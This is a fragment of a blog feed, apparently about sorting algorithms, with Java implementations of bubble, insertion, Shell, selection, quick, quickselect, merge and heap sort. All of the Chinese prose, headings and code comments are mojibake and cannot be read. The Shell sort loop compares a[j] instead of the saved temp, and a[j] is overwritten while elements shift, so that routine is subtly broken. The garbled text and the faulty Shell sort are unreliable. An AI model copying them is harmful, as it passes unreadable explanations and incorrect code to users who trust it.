âˆš</span></h1><p>è®¾æ•°ç»„é•¿åº¦ä¸ºNã€‚</p><p>1ï¼æ¯”è¾ƒç›¸é‚»çš„å‰åäºŒä¸ªæ•°æ®ï¼Œå¦‚æœå‰é¢æ•°æ®å¤§äºåé¢çš„æ•°æ®ï¼Œå°±å°†äºŒä¸ªæ•°æ®äº¤æ¢ã€‚</p><p>2ï¼è¿™æ ·å¯¹æ•°ç»„çš„ç¬¬0ä¸ªæ•°æ®åˆ°N-1ä¸ªæ•°æ®è¿›è¡Œä¸€æ¬¡éå†åï¼Œæœ€å¤§çš„ä¸€ä¸ªæ•°æ®å°±â€œæ²‰â€åˆ°æ•°ç»„ç¬¬N-1ä¸ªä½ç½®ã€‚</p><p>3ï¼N&#x3D;N-1ï¼Œå¦‚æœNä¸ä¸º0å°±é‡å¤å‰é¢äºŒæ­¥ï¼Œå¦åˆ™æ’åºå®Œæˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span> a[])&#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-<span class="number">1</span>; i++) &#123;</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; a.length-i-<span class="number">1</span>; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (a[j+<span class="number">1</span>]&lt;a[j]) swap(a,j,j+<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> a;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> a[i];</span><br><span class="line">       a[i]=a[j];</span><br><span class="line">       a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ’å…¥æ’åº">æ’å…¥æ’åº âˆš</span></h1><p>ç›´æ¥æ’å…¥æ’åº(Insertion Sort)çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šæ¯æ¬¡å°†ä¸€ä¸ªå¾…æ’åºçš„è®°å½•ï¼ŒæŒ‰å…¶å…³é”®å­—å¤§å°æ’å…¥åˆ°å‰é¢å·²ç»æ’å¥½åºçš„å­åºåˆ—ä¸­çš„é€‚å½“ä½ç½®ï¼Œç›´åˆ°å…¨éƒ¨è®°å½•æ’å…¥å®Œæˆä¸ºæ­¢ã€‚ </p><p>è®¾æ•°ç»„ä¸ºa[0â€¦n-1]ã€‚</p><ol><li><p>åˆå§‹æ—¶ï¼Œa[0]è‡ªæˆ1ä¸ªæœ‰åºåŒºï¼Œæ— åºåŒºä¸ºa[1..n-1]ã€‚ä»¤i&#x3D;1</p></li><li><p>å°†a[i]å¹¶å…¥å½“å‰çš„æœ‰åºåŒºa[0â€¦i-1]ä¸­å½¢æˆa[0â€¦i]çš„æœ‰åºåŒºé—´ã€‚</p></li><li><p>i++å¹¶é‡å¤ç¬¬äºŒæ­¥ç›´åˆ°i&#x3D;&#x3D;n-1ã€‚æ’åºå®Œæˆã€‚</p></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Insertsort2</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int</span> i, j;</span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">         <span class="keyword">if</span> (a[i] &lt; a[i - <span class="number">1</span>])</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">             j = i - <span class="number">1</span>;</span><br><span class="line">             <span class="keyword">for</span> (; j &gt;= <span class="number">0</span> &amp;&amp; a[j] &gt; temp; j--)</span><br><span class="line">                 a[j + <span class="number">1</span>] = a[j];</span><br><span class="line">             a[j + <span class="number">1</span>] = temp;</span><br><span class="line">         &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1><span id="å¸Œå°”æ’åº-">å¸Œå°”æ’åº -</span></h1><p>å¸Œå°”æ’åºçš„å®è´¨å°±æ˜¯åˆ†ç»„æ’å…¥æ’åºï¼Œè¯¥æ–¹æ³•åˆç§°ç¼©å°å¢é‡æ’åºï¼Œå› DLï¼Shelläº1959å¹´æå‡ºè€Œå¾—åã€‚</p><p>è¯¥æ–¹æ³•çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šå…ˆå°†æ•´ä¸ªå¾…æ’å…ƒç´ åºåˆ—åˆ†å‰²æˆè‹¥å¹²ä¸ªå­åºåˆ—ï¼ˆç”±ç›¸éš”æŸä¸ªâ€œå¢é‡â€çš„å…ƒç´ ç»„æˆçš„ï¼‰åˆ†åˆ«è¿›è¡Œç›´æ¥æ’å…¥æ’åºï¼Œç„¶åä¾æ¬¡ç¼©å‡å¢é‡å†è¿›è¡Œæ’åºï¼Œå¾…æ•´ä¸ªåºåˆ—ä¸­çš„å…ƒç´ åŸºæœ¬æœ‰åºï¼ˆå¢é‡è¶³å¤Ÿå°ï¼‰æ—¶ï¼Œå†å¯¹å…¨ä½“å…ƒç´ è¿›è¡Œä¸€æ¬¡ç›´æ¥æ’å…¥æ’åºã€‚å› ä¸ºç›´æ¥æ’å…¥æ’åºåœ¨å…ƒç´ åŸºæœ¬æœ‰åºçš„æƒ…å†µä¸‹ï¼ˆæ¥è¿‘æœ€å¥½æƒ…å†µï¼‰ï¼Œæ•ˆç‡æ˜¯å¾ˆé«˜çš„ï¼Œå› æ­¤å¸Œå°”æ’åºåœ¨æ—¶é—´æ•ˆç‡ä¸Šæ¯”å‰ä¸¤ç§æ–¹æ³•æœ‰è¾ƒå¤§æé«˜ã€‚ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] shellsort(<span class="type">int</span> a[])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j, gap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (gap = a.length / <span class="number">2</span>; gap &gt; <span class="number">0</span>; gap /= <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">for</span> (j = gap; j &lt; a.length; j++)<span class="comment">//ä»æ•°ç»„ç¬¬gapä¸ªå…ƒç´ å¼€å§‹</span></span><br><span class="line">                <span class="keyword">if</span> (a[j] &lt; a[j - gap])<span class="comment">//æ¯ä¸ªå…ƒç´ ä¸è‡ªå·±ç»„å†…çš„æ•°æ®è¿›è¡Œç›´æ¥æ’å…¥æ’åº</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[j];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> j - gap;</span><br><span class="line">                    <span class="keyword">for</span> (; k&gt;=<span class="number">0</span>&amp;&amp;a[j]&lt;a[k]; k-=gap) &#123;</span><br><span class="line">                        a[k+gap]=a[k];</span><br><span class="line">                    &#125;</span><br><span class="line">                    a[k + gap] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="é€‰æ‹©æ’åº-">é€‰æ‹©æ’åº -</span></h1><p>ç›´æ¥é€‰æ‹©æ’åºå’Œç›´æ¥æ’å…¥æ’åºç±»ä¼¼ï¼Œéƒ½å°†æ•°æ®åˆ†ä¸ºæœ‰åºåŒºå’Œæ— åºåŒºï¼Œæ‰€ä¸åŒçš„æ˜¯ç›´æ¥æ’å…¥æ’åºæ˜¯å°†æ— åºåŒºçš„ç¬¬ä¸€ä¸ªå…ƒç´ ç›´æ¥æ’å…¥åˆ°æœ‰åºåŒºä»¥å½¢æˆä¸€ä¸ªæ›´å¤§çš„æœ‰åºåŒºï¼Œè€Œç›´æ¥é€‰æ‹©æ’åºæ˜¯ä»æ— åºåŒºé€‰ä¸€ä¸ªæœ€å°çš„å…ƒç´ ç›´æ¥æ”¾åˆ°æœ‰åºåŒºçš„æœ€åã€‚ </p><p>è®¾æ•°ç»„ä¸ºa[0â€¦n-1]</p><ol><li><p>åˆå§‹æ—¶ï¼Œæ•°ç»„å…¨ä¸ºæ— åºåŒºä¸ºa[0..n-1]ã€‚ä»¤i&#x3D;0</p></li><li><p>åœ¨æ— åºåŒºa[iâ€¦n-1]ä¸­é€‰å–ä¸€ä¸ªæœ€å°çš„å…ƒç´ ï¼Œå°†å…¶ä¸a[i]äº¤æ¢ã€‚äº¤æ¢ä¹‹åa[0â€¦i]å°±å½¢æˆäº†ä¸€ä¸ªæœ‰åºåŒºã€‚</p></li><li><p>i++å¹¶é‡å¤ç¬¬äºŒæ­¥ç›´åˆ°i&#x3D;&#x3D;n-1ã€‚æ’åºå®Œæˆã€‚</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] selectsort(<span class="type">int</span> a[])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> i, j, nMinIndex;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            nMinIndex = i; <span class="comment">//æ‰¾æœ€å°å…ƒç´ çš„ä½ç½®</span></span><br><span class="line">            <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; a.length; j++)</span><br><span class="line">                <span class="keyword">if</span> (a[j] &lt; a[nMinIndex])</span><br><span class="line">                    nMinIndex = j;</span><br><span class="line"></span><br><span class="line">            swap(a,i, nMinIndex); <span class="comment">//å°†è¿™ä¸ªå…ƒç´ æ”¾åˆ°æ— åºåŒºçš„å¼€å¤´</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> a[i];</span><br><span class="line">       a[i]=a[j];</span><br><span class="line">       a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="å¿«é€Ÿæ’åº-">å¿«é€Ÿæ’åº -</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] quickSort(<span class="type">int</span>[] a)&#123;</span><br><span class="line">    <span class="keyword">return</span> qs(a, <span class="number">0</span>, a.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span>[] qs(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,j=hi;</span><br><span class="line">    <span class="keyword">if</span>(lo&gt;hi) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> a[i];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x) j--;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x) i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    qs(a,lo,i-<span class="number">1</span>);</span><br><span class="line">    qs(a,i+<span class="number">1</span>,hi);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å¿«é€Ÿé€‰æ‹©-">å¿«é€Ÿé€‰æ‹© -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">GetLeastNumbers_Solution</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (k &gt; nums.length || k &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    findKthSmallest(nums, k - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* findKthSmallest ä¼šæ”¹å˜æ•°ç»„ï¼Œä½¿å¾—å‰ k ä¸ªæ•°éƒ½æ˜¯æœ€å°çš„ k ä¸ªæ•° */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">        ret.add(nums[i]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">findKthSmallest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, h = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; h) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> AdjustArray(nums, l, h);      </span><br><span class="line">        <span class="keyword">if</span> (j == k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (j &gt; k)</span><br><span class="line">            h = j - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">AdjustArray</span><span class="params">(<span class="type">int</span> s[], <span class="type">int</span> l, <span class="type">int</span> r)</span> <span class="comment">//è¿”å›è°ƒæ•´ååŸºå‡†æ•°çš„ä½ç½®</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=l,j=r,x=s[l];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;s[j]&gt;=x)j--;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) s[i]=s[j];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;s[i]&lt;x)i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) s[j]=s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    s[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="å½’å¹¶æ’åº-">å½’å¹¶æ’åº -</span></h1><p> å½’å¹¶æ’åºæ˜¯å»ºç«‹åœ¨å½’å¹¶æ“ä½œä¸Šçš„ä¸€ç§æœ‰æ•ˆçš„æ’åºç®—æ³•ã€‚è¯¥ç®—æ³•æ˜¯é‡‡ç”¨åˆ†æ²»æ³•ï¼ˆDivide and Conquerï¼‰çš„ä¸€ä¸ªéå¸¸å…¸å‹çš„åº”ç”¨ã€‚</p><p>é¦–å…ˆè€ƒè™‘ä¸‹å¦‚ä½•å°†å°†äºŒä¸ªæœ‰åºæ•°åˆ—åˆå¹¶ã€‚è¿™ä¸ªéå¸¸ç®€å•ï¼Œåªè¦ä»æ¯”è¾ƒäºŒä¸ªæ•°åˆ—çš„ç¬¬ä¸€ä¸ªæ•°ï¼Œè°å°å°±å…ˆå–è°ï¼Œå–äº†åå°±åœ¨å¯¹åº”æ•°åˆ—ä¸­åˆ é™¤è¿™ä¸ªæ•°ã€‚ç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰æ•°åˆ—ä¸ºç©ºï¼Œé‚£ç›´æ¥å°†å¦ä¸€ä¸ªæ•°åˆ—çš„æ•°æ®ä¾æ¬¡å–å‡ºå³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergearray</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> first, <span class="type">int</span> mid, <span class="type">int</span> last, <span class="type">int</span> temp[])</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> first, j = mid + <span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> mid,   n = last;</span><br><span class="line">     <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (i &lt;= m &amp;&amp; j &lt;= n)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">             temp[k++] = a[i++];</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             temp[k++] = a[j++];</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (i &lt;= m)</span><br><span class="line">         temp[k++] = a[i++];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (j &lt;= n)</span><br><span class="line">         temp[k++] = a[j++];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">         a[first + i] = temp[i];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergesort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> first, <span class="type">int</span> last, <span class="type">int</span> temp[])</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (first &lt; last)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (first + last) / <span class="number">2</span>;</span><br><span class="line">         mergesort(a, first, mid, temp);    <span class="comment">//å·¦è¾¹æœ‰åº</span></span><br><span class="line">         mergesort(a, mid + <span class="number">1</span>, last, temp); <span class="comment">//å³è¾¹æœ‰åº</span></span><br><span class="line">         mergearray(a, first, mid, last, temp); <span class="comment">//å†å°†äºŒä¸ªæœ‰åºæ•°åˆ—åˆå¹¶</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">MergeSort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int</span> []p = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">     mergesort(a, <span class="number">0</span>, n - <span class="number">1</span>, p);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="å †æ’åº-">å †æ’åº -</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Heap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="comment">//æ„å»ºå †</span></span><br><span class="line">        buildHeap(arr,length);</span><br><span class="line">        <span class="keyword">for</span> ( <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i-- ) &#123;</span><br><span class="line">            <span class="comment">//å°†å †é¡¶å…ƒç´ ä¸æœ«ä½å…ƒç´ è°ƒæ¢</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">            arr[<span class="number">0</span>] = arr[i];</span><br><span class="line">            arr[i] = temp;</span><br><span class="line">            <span class="comment">//æ•°ç»„é•¿åº¦-1 éšè—å †å°¾å…ƒç´ </span></span><br><span class="line">            length--;</span><br><span class="line">            <span class="comment">//å°†å †é¡¶å…ƒç´ ä¸‹æ²‰ ç›®çš„æ˜¯å°†æœ€å¤§çš„å…ƒç´ æµ®åˆ°å †é¡¶æ¥</span></span><br><span class="line">            sink(arr,<span class="number">0</span>,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">buildHeap</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> length / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            sink(arr,i,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¸‹æ²‰è°ƒæ•´</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr æ•°ç»„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> index è°ƒæ•´ä½ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length æ•°ç»„èŒƒå›´</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> index,<span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftChild</span> <span class="operator">=</span> <span class="number">2</span> * index + <span class="number">1</span>;<span class="comment">//å·¦å­èŠ‚ç‚¹ä¸‹æ ‡</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightChild</span> <span class="operator">=</span> <span class="number">2</span> * index + <span class="number">2</span>;<span class="comment">//å³å­èŠ‚ç‚¹ä¸‹æ ‡</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">present</span> <span class="operator">=</span> index;<span class="comment">//è¦è°ƒæ•´çš„èŠ‚ç‚¹ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¸‹æ²‰å·¦è¾¹</span></span><br><span class="line">        <span class="keyword">if</span> (leftChild &lt; length &amp;&amp; arr[leftChild] &gt; arr[present]) &#123;</span><br><span class="line">            present = leftChild;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¸‹æ²‰å³è¾¹</span></span><br><span class="line">        <span class="keyword">if</span> (rightChild &lt; length &amp;&amp; arr[rightChild] &gt; arr[present]) &#123;</span><br><span class="line">            present = rightChild;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¦‚æœä¸‹æ ‡ä¸ç›¸ç­‰ è¯æ˜è°ƒæ¢è¿‡äº†</span></span><br><span class="line">        <span class="keyword">if</span> (present != index) &#123;</span><br><span class="line">            <span class="comment">//äº¤æ¢å€¼</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[index];</span><br><span class="line">            arr[index] = arr[present];</span><br><span class="line">            arr[present] = temp;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ç»§ç»­ä¸‹æ²‰</span></span><br><span class="line">            sink(arr,present,length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       Heap.sort(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p><img src="/2020/04/11/sorting/image-20200411191839807.png"></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
